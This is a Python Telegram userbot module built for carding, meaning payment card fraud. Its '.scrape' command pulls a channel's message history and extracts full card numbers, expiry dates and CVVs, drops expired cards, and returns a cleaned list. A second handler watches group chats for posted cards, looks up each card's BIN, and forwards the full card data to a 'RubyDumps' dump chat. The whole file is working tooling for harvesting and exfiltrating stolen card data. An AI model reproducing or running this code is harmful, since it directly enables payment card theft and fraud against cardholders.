import re
import asyncio
import os
import io
import aiohttp

from telethon import events, types, errors
from telethon.tl.functions.messages import GetHistoryRequest
from ..func import http
from bs4 import BeautifulSoup as bs
from ubb import Ubot, DUMP_ID
from datetime import datetime


d = datetime.now()
m = d.strftime("%m")
y = d.strftime("%Y")


@Ubot.on(events.NewMessage(pattern=r'\.scrape'))
async def scrapper(event):
    # use .scrape [channel_id or username] 100
    # default limit 100 u can scrape below 100 at a time
    target, limit = event.message.message[len('.scrape '):].split()
    if str(target).startswith('-1'):
        target = int(target)
    posts = await Ubot(
        GetHistoryRequest(
            peer=target, 
            limit=int(limit), 
            offset_date=None, 
            offset_id=0, 
            max_id=0, 
            min_id=0,
            add_offset=0,
            hash=0)
    )
    cards = re.findall(r"message='([^']+)", posts.stringify())
    RAWCC = []
    for cc in cards:
        try:
            x = re.findall('[0-9]+', cc)
            cn = x[0]
            mm = x[1]
            yy = x[2]
            cvv = x[3]
            if str(mm).startswith('2'):
                mm, yy = yy, mm
            if len(mm) >= 3: 
                mm, yy, cvv = yy, cvv, mm
            if len(mm) == 1:
                mm = f'0{mm}'
            if len(yy) == 2:
                yy = f'20{yy}'
            if mm+yy <= m+y:
                continue
            value = f'{cn}|{mm}|{yy}|{cvv}\n'
            regex = re.compile(r'((?:(^(4|5|6)[0-9]{15,15})|(^3[0-9]{14,14}))\|[0-9]{1,2}\|[0-9]{2,4}\|[0-9]{3,4})')
            if regex.match(value):
                RAWCC.append(value)  # append valid format ccs!
        except:
            pass
        
    CLEAN = set(RAWCC) # rm duplicates from list
    for CC in CLEAN:
        with io.open(f'{target}.txt', 'a') as f:
            f.write(CC)
    await Ubot.send_file(event.peer_id,
                         f'{target}.txt', 
                         caption=f'**CC Scrapper\nNo. of cards from {target}: {len(CLEAN)}\nUserBotBy-» @Xbinner2**',
                         force_document=True)
    os.remove(f'{target}.txt') # rm old file to prevent duplicates
    
    
@Ubot.on(events.NewMessage())  # pylint:disable=E0602
async def check_incoming_messages(event):
    me = await Ubot.get_me()
    if event.sender_id == me.id:
        return
    entities = event.message.entities
    prefixes = ['?', '/', '.', '!']
    m = event.message.message
    if m.startswith(tuple(prefixes)) or len(m) < 25 or event.is_private or len(m) > 600:
        return
    is_cc = False
    if entities:
        for entity in entities:
            if isinstance(entity, types.MessageEntityBankCard) or isinstance(entity, types.MessageEntityPre):
                is_cc = True
            if is_cc:
                try:
                    # Extract Relevant Data
                    card_number = re.search(r'\d{15,16}', m)[0]
                    exp_month = re.search(r'\b\d{2}\b', m)[0]  # Assuming 2-digit month
                    exp_year_match = re.search(r'\b20\d{2}\b', m)
                    exp_year = exp_year_match[0] if exp_year_match else "Year Not Found"
                    cvv = re.search(r'\b\d{3}\b', m)[0]  # Assuming 3-digit CVV

                    BIN = card_number[:6]

                    # BIN Lookup (Using aiohttp for asynchronous requests)
                    async with aiohttp.ClientSession() as session:
                        async with session.get(f'https://bins.ws/search?bins={BIN}') as r:
                            soup = bs(await r.text(), 'html.parser')
                            k = soup.find("div", {"class": "page"})
                            bin_info = k.get_text()[62:] if k else "BIN Info Not Found"

                    # Construct Custom Response
                    response = f"""
                                RubyDumps
                                ----------
                                {card_number}|{exp_month}|{exp_year}|{cvv}

                                {bin_info}
                                """
                    
                    await Ubot.send_message(DUMP_ID, response)

                except IndexError:  # Handle the case where a pattern isn't found 
                    await Ubot.send_message(DUMP_ID, "Error: Invalid card data format")
                except errors.FloodWaitError as e:
                    print(f'flood wait: {e.seconds}')
                    await asyncio.sleep(e.seconds)
                    await Ubot.send_message(DUMP_ID, response)  # Retry sending the response
